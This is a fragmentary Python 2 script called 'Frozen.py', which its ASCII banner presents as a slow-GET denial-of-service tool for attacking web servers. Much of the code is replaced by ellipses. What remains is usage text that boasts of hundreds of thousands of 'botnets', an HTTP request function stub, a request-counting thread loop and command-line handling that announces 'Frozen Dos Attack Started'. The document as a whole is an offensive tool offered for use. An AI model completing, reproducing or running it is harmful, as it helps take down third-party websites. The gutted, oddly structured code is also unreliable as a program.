...
def usage():
	print ' Total Botnets: 798,453'
	print ' ./Usage: Frozen.py <url>'
	print ' Example: Frozen.py http://example.com/'
	print "\a"
print \
"""
...
`;                                                        ;,
 ...
 Frozen Most Dangerios Web Server Slow Get Request ( Denial Of Service ) Tool Created By TSG-TIM                                                    
""" 
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "................... Bots connected to the site packets Generating ..................."
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n Bots Connets to the Site Random Packets Generated"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Frozen Dos  Attack Started Connecting to The Site"
		print "zombie-servers is checking......"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
